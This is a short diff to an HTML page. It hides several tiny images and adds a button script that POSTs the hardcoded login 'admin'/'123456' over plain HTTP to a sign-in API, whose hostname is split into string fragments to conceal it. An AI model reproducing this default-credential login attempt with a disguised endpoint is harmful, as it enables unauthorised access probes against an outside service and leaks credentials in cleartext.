@@ -1,7 +1,33 @@
-<img src="https://www.baidu.com/img/flexible/logo/pc/result.png" width="300px" height="200px"/>
-<img src="http://upload.cankaoxiaoxi.com/2020/0824/1598239484780.jpg" width="3px" height="2px"/>
+<img src="https://www.baidu.com/img/flexible/logo/pc/result.png" width="3px" height="2px"/>
 
+<!--
+<img src="http://upload.cankaoxiaoxi.com/2020/0824/1598239484780.jpg" width="3px" height="2px"/>
 <img src="http://upload.cankaoxiaoxi.com/2020/0822/1598076024945.jpg" width="3px" height="2px"/>
 
 <img src="http://www.cqcoal.com/img/titlog.png" width="3px" height="2px"/>
 <img src="http://www.cqcoal.com/img/slideBox/3.png?v=0.9357710494137348" width="3px" height="2px"/>
+-->
+
+<script type="text/javascript" src="jquery.min.js"></script>
+
+<script type="text/javascript">
+
+	function login() {
+		var params = {
+			"username": "admin",
+			"password": "123456"
+		};
+		$.ajax({
+			url: "http://ta" + "o" +  "tie." + "mi" + "ssf" + "res" + "h" + ".ne" + "t/api/" + "sign" + "In", 
+			contentType: 'application/json',
+  			type: 'POST',
+			data: JSON.stringify(params), 
+			success: function(resp) {
+				alert(resp);
+			}
+		});
+	};
+
+</script>
+
+<input type="button" onclick="login();" />
